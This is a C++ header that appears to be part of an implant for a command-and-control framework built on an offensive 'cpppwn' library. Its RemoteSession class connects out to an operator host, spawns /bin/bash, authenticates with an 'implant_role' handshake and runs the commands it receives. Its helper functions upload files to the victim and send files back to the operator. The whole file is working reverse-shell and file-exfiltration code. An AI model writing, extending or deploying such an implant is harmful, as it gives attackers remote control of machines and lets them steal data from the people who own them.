#pragma once

#include "Util/SafeLogger.hpp"
#include <Remote.hpp>
#include <Shell.hpp>
#include <SessionHandshake.hpp>
#include <SessionTransfer.hpp>
#include <chrono>
#include <filesystem>
#include <format>
#include <fstream>
#include <string>
#include <thread>
#include <vector>

#include <cpppwn.hpp>

namespace {

void send_transfer_error(cpppwn::Remote& conn, const std::string& message) {
    const auto payload = "ERROR: " + message;
    conn.sendline(std::to_string(payload.size()));
    if (!payload.empty()) {
        conn.send(payload);
    }
}

void send_transfer_success(cpppwn::Remote& conn, const std::string& message) {
    conn.sendline(std::to_string(message.size()));
    if (!message.empty()) {
        conn.send(message);
    }
}

void drain_shell_output(cpppwn::Process& shell) {
    for (int attempt = 0; attempt < 8; ++attempt) {
        if (shell.recv_timeout(std::chrono::milliseconds(25)).empty()) {
            break;
        }
    }
}

std::string get_shell_cwd(cpppwn::Process& shell) {
    drain_shell_output(shell);
    shell.sendline("pwd -P");
    std::string accumulated;
    for (int attempt = 0; attempt < 20; ++attempt) {
        accumulated += shell.recv_timeout(std::chrono::milliseconds(50));
    }

    std::string last_path;
    std::string line;
    for (char ch : accumulated) {
        if (ch == '\n' || ch == '\r') {
            const auto trimmed = trim_string(line);
            if (!trimmed.empty() && trimmed.front() == '/') {
                last_path = trimmed;
            }
            line.clear();
        } else {
            line.push_back(ch);
        }
    }

    const auto trimmed = trim_string(line);
    if (!trimmed.empty() && trimmed.front() == '/') {
        last_path = trimmed;
    }

    return last_path;
}

bool handle_download(cpppwn::Remote& conn, cpppwn::Process& shell, const std::string& filename) {
    const auto cwd = get_shell_cwd(shell);
    if (cwd.empty()) {
        send_transfer_error(conn, "unable to resolve remote working directory");
        return true;
    }

    const std::filesystem::path remote_path = std::filesystem::path(cwd) / filename;
    if (!std::filesystem::is_regular_file(remote_path)) {
        send_transfer_error(conn, "file not found in remote working directory");
        return true;
    }

    const auto file_size = std::filesystem::file_size(remote_path);
    if (file_size == 0 || file_size > session_transfer::kMaxTransferBytes) {
        send_transfer_error(conn, "file size is invalid or exceeds transfer limit");
        return true;
    }

    std::ifstream input(remote_path, std::ios::binary);
    if (!input) {
        send_transfer_error(conn, "failed to open remote file");
        return true;
    }

    std::string data;
    data.resize(file_size);
    if (!input.read(data.data(), static_cast<std::streamsize>(file_size))) {
        send_transfer_error(conn, "failed to read remote file");
        return true;
    }

    conn.sendline(std::to_string(data.size()));
    if (!data.empty()) {
        conn.send(data);
    }
    return true;
}

bool handle_upload(cpppwn::Remote& conn, cpppwn::Process& shell, const std::string& filename, std::size_t size) {
    const auto cwd = get_shell_cwd(shell);
    if (cwd.empty()) {
        send_transfer_error(conn, "unable to resolve remote working directory");
        return true;
    }

    const auto payload = conn.recv(size);
    if (payload.size() != size) {
        send_transfer_error(conn, "upload payload incomplete");
        return true;
    }

    const std::filesystem::path remote_path = std::filesystem::path(cwd) / filename;
    std::ofstream output(remote_path, std::ios::binary | std::ios::trunc);
    if (!output || !output.write(payload.data(), static_cast<std::streamsize>(payload.size()))) {
        send_transfer_error(conn, "failed to write remote file");
        return true;
    }

    send_transfer_success(conn, std::format("Uploaded {} bytes to {}", payload.size(), filename));
    return true;
}

} // namespace

class RemoteSession {
private:
    std::atomic<bool>& global_running;
    std::string host;
    int port;
    std::string session_id;
    std::string username;
    std::string password;

public:
    RemoteSession(
        std::string id,
        std::string h,
        int p,
        std::string user,
        std::string pass,
        std::atomic<bool>& run)
        : global_running(run),
          host(std::move(h)),
          port(p),
          session_id(std::move(id)),
          username(std::move(user)),
          password(std::move(pass)) {}

    void run() {
        try {
            logger::debug("Session {}: Attempting connection to {}:{}", session_id, host, port);
            cpppwn::Remote conn(host, port, true, false);
            cpppwn::Process shell("/bin/bash", {"/bin/bash"});
            logger::debug("Session {}: Connection established and shell spawned.", session_id);

            session_handshake::send(conn, session_handshake::implant_role, username, password);

            while (global_running && conn.is_alive() && shell.is_alive()) {
                session_handshake::clear_recv_buffer(conn);
                const auto cmd = trim_string(conn.recvline());
                logger::debug("Shell Command: [{}]", cmd);

                if (const auto filename = session_transfer::parse_download_filename(cmd)) {
                    handle_download(conn, shell, *filename);
                    continue;
                }

                if (const auto upload = session_transfer::parse_upload_command(cmd)) {
                    handle_upload(conn, shell, upload->first, upload->second);
                    continue;
                }

                shell.sendline(cmd);

                const auto output = trim_string(shell.recv_timeout(std::chrono::milliseconds(100)));
                logger::debug("Output [{}]: [{}]", output.size(), output);
                conn.sendline(std::to_string(output.size()));

                if (output.size() > 0) {
                    conn.send(output);
                }
            }
        } catch (const std::exception& e) {
            logger::debug("Session [{}] encountered error: {}", session_id, e.what());
        }
        logger::debug("Session [{}] closed.", session_id);
    }
};

class SessionManager {
private:
    struct SessionEntry {
        std::thread worker;
        std::atomic<bool> running_flag{true};
    };

    std::map<std::string, std::unique_ptr<SessionEntry>> sessions;
    std::mutex mtx;

public:
    void start_session(
        const std::string& id,
        const std::string& host,
        int port,
        const std::string& username,
        const std::string& password) {
        std::lock_guard lock(mtx);
        if (sessions.contains(id)) {
            return;
        }

        auto entry = std::make_unique<SessionEntry>();
        entry->worker = std::thread([id, host, port, username, password, &run = entry->running_flag]() -> void {
            RemoteSession session(id, host, port, username, password, run);
            session.run();
        });

        sessions[id] = std::move(entry);
    }

    void stop_sessions() {
        std::vector<std::thread> workers;
        {
            std::lock_guard lock(mtx);
            workers.reserve(sessions.size());
            for (auto& [id, session] : sessions) {
                session->running_flag = false;
                if (session->worker.joinable()) {
                    workers.push_back(std::move(session->worker));
                }
            }
            sessions.clear();
        }

        for (auto& worker : workers) {
            if (worker.joinable()) {
                worker.join();
            }
        }
    }
};
